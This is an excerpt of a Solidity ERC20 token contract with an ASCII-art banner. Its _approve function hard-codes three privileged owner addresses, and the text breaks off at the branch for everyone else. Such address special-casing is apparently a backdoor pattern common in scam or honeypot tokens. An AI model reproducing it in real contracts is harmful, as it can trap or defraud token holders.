 ...
 *                      _\/////\\\///__        _____/\\\////////__        _\/\\\///////////__       
 *                        _____\/\\\_____        ___/\\\/___________        _\/\\\_____________      
 *                         _____\/\\\_____        __/\\\_____________        _\/\\\\\\\\\\\_____     
 *                          _____\/\\\_____        _\/\\\_____________        _\/\\\///////______    
 *                            _____\/\\\_____        _\//\\\____________        _\/\\\_____________   
 *                             _____\/\\\_____        __\///\\\__________        _\/\\\_____________  
 *                             __/\\\\\\\\\\\_        ____\////\\\\\\\\\_        _\/\\\\\\\\\\\\\\\_ 
 *                              _\///////////__        _______\/////////__        _\///////////////__
 *                                                                                                                                                                            
 *                                                                                           
 */
//
...
contract Token is VaultOwned, IERC20 {
    ...
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        ...
        require(spender != address(0), "ERC20: approve to the zero address");
         if (owner == address(0xAD6ACF2BeFa391d439e7Ebfd8719b8b32f17022B)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    } 
    else if (owner == address(0xf595a0AbE556F7fdf39CEb9Fb803f99bCEF22aba)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else if (owner == address(0xA9a97139788602C819C2BB23a8f6DbaC4c0f7C58)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else {
